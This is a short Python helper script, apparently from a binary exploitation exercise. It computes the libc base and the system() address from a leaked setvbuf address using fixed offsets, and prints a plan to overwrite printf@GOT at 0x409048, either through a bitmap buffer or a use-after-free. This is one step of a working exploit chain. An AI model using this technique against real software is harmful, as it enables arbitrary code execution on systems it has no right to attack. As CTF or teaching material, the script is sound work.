#!/usr/bin/env python3
"""
Calculate system() address from leaked setvbuf address
"""

def calculate_system(leaked_addr):
    """Calculate system() address"""
    setvbuf_offset = 0x88550
    system_offset = 0x58750
    
    libc_base = leaked_addr - setvbuf_offset
    system_addr = libc_base + system_offset
    
    return libc_base, system_addr

def main():
    # From user output
    leaked_addr = 0x7ca596e88550
    
    print("=== Calculate system() Address ===")
    print(f"Leaked address: 0x{leaked_addr:x} ({leaked_addr})")
    print(f"setvbuf offset: 0x88550")
    print(f"system offset: 0x58750")
    print()
    
    libc_base, system_addr = calculate_system(leaked_addr)
    
    print(f"libc_base = 0x{leaked_addr:x} - 0x88550 = 0x{libc_base:x}")
    print(f"system_addr = 0x{libc_base:x} + 0x58750 = 0x{system_addr:x}")
    print()
    print(f"system_addr (decimal): {system_addr}")
    print()
    print("=== Generate Write Code ===")
    print("To write system_addr to printf@GOT (0x409048):")
    print("Need bitmap buffer address to calculate coordinates")
    print("Or use use-after-free approach")

if __name__ == "__main__":
    main()

